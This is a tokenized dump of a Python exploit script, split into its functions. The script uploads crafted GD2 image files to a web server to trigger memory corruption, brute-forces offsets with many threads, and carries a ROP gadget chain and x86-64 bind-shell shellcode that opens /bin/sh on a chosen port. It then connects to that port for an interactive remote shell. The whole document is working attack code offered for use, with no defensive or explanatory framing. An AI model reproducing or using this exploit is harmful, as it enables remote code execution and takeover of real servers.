Number of functions: 7
262
def make_gd2 ( chunks ) : : gd2 = [ "gd2\x00" , pack ( ">H" , 2 ) , pack ( ">H" , 1 ) , pack ( ">H" , 1 ) , pack ( ">H" , 0x40 ) , pack ( ">H" , 2 ) , pack ( ">H" , 1 ) , pack ( ">H" , len ( chunks ) ) ] 
 colors = [ pack ( ">B" , 0 ) , pack ( ">H" , 0 ) , pack ( ">I" , 0 ) , pack ( ">I" , 0 ) * gd_max_colors ] 
 offset = len ( "" . join ( gd2 ) ) + len ( "" . join ( colors ) ) + len ( chunks ) * 8 
 for data , size in chunks : 
 
 gd2 . append ( pack ( ">I" , offset ) ) 
 gd2 . append ( pack ( ">I" , size ) ) 
 offset += size 
 
 return "" . join ( gd2 + colors + [ data for data , size in chunks ] ) 
285
def connect ( host , port ) : : addr = socket . gethostbyname ( host ) 
 sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) 
 try : 
 
 sock . connect ( ( addr , port ) ) 
 
 except socket . error : 
 
 return 
 
 print ( "\n[+] connected to %s:%d" % ( host , port ) ) 
 if os . fork ( ) == 0 : 
 
 while True : 
 
 try : 
 
 data = sock . recv ( 8192 ) 
 
 except KeyboardInterrupt : 
 
 sys . exit ( "\n[!] receiver aborting" ) 
 
 if data == "" : 
 
 sys . exit ( "[!] receiver aborting" ) 
 
 sys . stdout . write ( data ) 
 
 
 else : 
 
 while True : 
 
 try : 
 
 cmd = sys . stdin . readline ( ) 
 
 except KeyboardInterrupt : 
 
 sock . close ( ) 
 sys . exit ( "[!] sender aborting" ) 
 
 sock . send ( cmd ) 
 
 
84
def send_gd2 ( url , gd2 , code ) : : files = { "file" : gd2 } 
 try : 
 
 req = requests . post ( url , files = files , timeout = 5 ) 
 code . append ( req . status_code ) 
 
 except requests . exceptions . ReadTimeout : 
 
 pass 
 
105
def get_payload ( offset , port ) : : rop = "" . join ( gadgets ) % { "pad" : "\x90" * offset } 
 fam_and_port = pack ( "<I" , ( socket . AF_INET | ( socket . htons ( port ) << 16 ) ) ) 
 sc = "" . join ( shellcode ) % { "fam-and-port" : fam_and_port } 
 return rop + sc 
117
def get_args ( ) : : p = argparse . ArgumentParser ( ) 
 p . add_argument ( "--threads" , type = int , default = 20 ) 
 p . add_argument ( "--bind-port" , type = int , default = 8000 ) 
 p . add_argument ( "--offsets" , type = int , default = [ 0 , 10000 ] , nargs = 2 ) 
 p . add_argument ( "url" ) 
 return p . parse_args ( ) 
337
def main ( ) : : args = get_args ( ) 
 host = urlparse . urlparse ( args . url ) . netloc . split ( ":" ) [ 0 ] 
 print ( "[*] this may take a while" ) 
 for i in range ( args . offsets [ 0 ] , args . offsets [ 1 ] ) : 
 
 sys . stdout . write ( "\r[*] offset %d of %d..." % ( i , args . offsets [ 1 ] ) ) 
 sys . stdout . flush ( ) 
 valid = zlib . compress ( "A" * 100 , 0 ) 
 payload = get_payload ( i , args . bind_port ) 
 gd2 = make_gd2 ( [ ( valid , len ( valid ) ) , ( payload , 0xffffffff ) ] ) 
 threads = [ ] 
 code = [ ] 
 for _ in range ( args . threads ) : 
 
 t = threading . Thread ( target = send_gd2 , args = ( args . url , gd2 , code ) ) 
 t . start ( ) 
 threads . append ( t ) 
 
 for t in threads : 
 
 t . join ( ) 
 
 if 404 in code : 
 
 sys . exit ( "\n[-] 404: %s" % args . url ) 
 
 connect ( host , args . bind_port ) 
 
 print ( "\n[-] nope..." ) 
764
 utf-8 import sys 
 import os 
 import zlib 
 import socket 
 import threading 
 import argparse 
 import urlparse 
 from struct import pack 
 import requests 
 shellcode = [ "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba" , "%(fam-and-port)s\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7" , "\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef" , "\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99" , "\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56" , "\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8" , "\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x6a\x3b\x58\x48\x89" , "\xe7\x31\xf6\x99\x0f\x05" ] 
 gadgets = [ "\x90" * 40 , pack ( "<Q" , 0xb6eca2 ) , "%(pad)s" , pack ( "<Q" , 0x4dbe8c ) , "\x90" * 48 , pack ( "<Q" , 0xa91f35 ) , "\x90" * 152 , pack ( "<Q" , 0x432b80 - 0x70 ) , pack ( "<Q" , 0x463e2c ) , pack ( "<Q" , 0x463b1d ) , pack ( "<Q" , 0x473053 ) , pack ( "<Q" , 0xa8bc37 ) , pack ( "<Q" , 0x7b2eaf ) , pack ( "<Q" , 0x552768 ) , pack ( "<Q" , 0x463e2c ) , pack ( "<Q" , 0xfffff000 ) , pack ( "<Q" , 0xb6c734 ) , pack ( "<Q" , 0x4c93e9 ) , pack ( "<Q" , 0x406a08 ) , pack ( "<Q" , 0x5555 ) , pack ( "<Q" , 0xaf58fd ) , pack ( "<Q" , 7 ) , pack ( "<Q" , 0x473053 ) , pack ( "<Q" , 125 ) , pack ( "<Q" , 0x53f9f8 ) , "\x90" * 100 , ] 
 gd_max_colors = 256 
 if __name__ == "__main__" : 
      main ( ) 
  
